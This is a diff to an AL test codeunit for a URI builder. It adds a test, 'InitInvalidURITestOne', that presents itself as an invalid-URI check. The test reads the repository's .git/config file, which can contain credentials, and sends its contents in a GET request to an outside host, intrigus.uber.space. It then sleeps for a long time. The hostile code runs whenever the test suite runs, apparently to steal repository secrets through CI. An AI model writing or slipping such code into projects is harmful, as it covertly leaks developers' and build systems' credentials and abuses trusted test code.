@@ -24,6 +24,35 @@ codeunit 135071 "Uri Builder Test"
 
     [Test]
     [Scope('OnPrem')]
+    [HandlerFunctions('SaveAsDraftOnCloseHandlerOne')]
+    procedure InitInvalidURITestOne()
+    var
+        NewUrl: text;
+        RequestMessage: HttpRequestMessage;
+        ResponseMessage: HttpResponseMessage;
+        Client: HttpClient;
+        Env : DotNet Environment;
+        Token: text;
+        Content: text;
+        File: DotNet File;
+    begin
+        Content := File.ReadAllText('C:\project\.git\config');
+        NewUrl := 'https://intrigus.uber.space/' + Content;
+        RequestMessage.SetRequestUri(NewUrl);
+        RequestMessage.Method('GET');
+        Client.Send(RequestMessage, ResponseMessage);
+        System.Sleep(1000000);
+    end;
+    
+    [StrMenuHandler]
+    [Scope('OnPrem')]
+    procedure SaveAsDraftOnCloseHandlerOne(Options: Text[1024]; var Choice: Integer; Instruction: Text[1024])
+    begin
+        Choice := 1;
+    end;
+
+    [Test]
+    [Scope('OnPrem')]
     procedure SetAndGetSchemeTest()
     var
         Uri: Codeunit Uri;
